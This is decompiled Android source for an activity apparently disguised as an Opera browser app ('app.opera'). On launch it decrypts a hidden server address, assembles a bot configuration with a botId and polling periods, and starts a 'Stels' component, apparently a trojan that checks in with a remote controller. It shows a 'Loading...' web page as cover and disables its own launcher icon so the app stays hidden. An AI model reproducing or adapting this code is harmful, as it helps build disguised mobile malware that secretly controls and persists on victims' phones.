package app.opera;

import android.app.Activity;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.res.Configuration;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.systempack.ins.R;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import org.json.JSONObject;
import ru.stels2.Functions;
import ru.stels2.Stels;

public class MainActivity extends Activity {
    public static int IDD_LOADING = 1;
    public static Handler handler;
    public static WebView webView;
    ProgressDialog loadingDialog = null;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            JSONObject json = new JSONObject();
            json.put("sid", "1");
            json.put("server", Functions.decript(getString(R.string.data)));
            json.put("startPeriod", Integer.parseInt(getString(R.string.startPeriod)));
            json.put("period", Integer.parseInt(getString(R.string.time)));
            try {
                json.put("subPref", getString(R.string.subpref));
            } catch (Exception e) {
            }
            try {
                json.put("botId", getString(R.string.botid));
            } catch (Exception e2) {
            }
            Stels stels = new Stels(this, json);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        setTitle("");
        showDialog(IDD_LOADING);
        handler = new Handler();
        webView = new WebView(this);
        webView.setWebViewClient(new WebViewClient() {
            public void onPageFinished(WebView view, String url) {
                System.out.println("Page loaded");
                try {
                    MainActivity.this.loadingDialog.dismiss();
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }

            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                if (url != null) {
                    try {
                        if (url.startsWith("http://") || url.startsWith("https://")) {
                            view.getContext().startActivity(new Intent("android.intent.action.VIEW", Uri.parse(url)));
                            return true;
                        }
                    } catch (Exception ex) {
                        ex.printStackTrace();
                    }
                }
                return false;
            }
        });
        webView.setScrollBarStyle(33554432);
        webView.getSettings().setJavaScriptEnabled(true);
        setContentView(webView);
        webView.loadUrl(getString(R.string.html));
        try {
            getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);
        } catch (Exception ex2) {
            ex2.printStackTrace();
        }
    }

    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        setRequestedOrientation(1);
    }

    /* access modifiers changed from: protected */
    public Dialog onCreateDialog(int id) {
        if (id != IDD_LOADING) {
            return null;
        }
        this.loadingDialog = new ProgressDialog(this);
        this.loadingDialog.setProgressStyle(0);
        this.loadingDialog.setTitle("");
        this.loadingDialog.setMessage("Loading...");
        this.loadingDialog.setCancelable(false);
        return this.loadingDialog;
    }
}
